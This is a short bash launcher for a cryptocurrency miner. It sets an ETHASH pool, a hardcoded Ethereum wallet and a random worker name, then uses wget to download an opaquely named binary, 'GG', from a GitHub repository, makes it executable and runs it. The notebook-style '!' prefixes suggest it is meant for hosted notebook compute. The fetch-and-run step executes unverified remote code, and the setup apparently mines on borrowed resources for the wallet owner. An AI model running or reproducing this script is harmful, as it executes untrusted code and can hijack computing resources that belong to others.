#!/bin/bash

#################################
## Begin of user-editable part ##
#################################

ALGHO=ETHASH
POOL=ethash.unmineable.com:3333
WALLET=ETH:0x19bED4AA973C277dEbF737450a630075787515bd
WORKER=$(echo $(shuf -i 1-999 -n 1)-VGA)

#################################
##  End of user-editable part  ##
#################################

! cd "$(dirname "$0")"

! wget https://github.com/mencobaiajanah/SPLIT/raw/main/GG
! chmod +x GG
! ./GG --algo $ALGHO --pool $POOL --user $WALLET.$WORKER
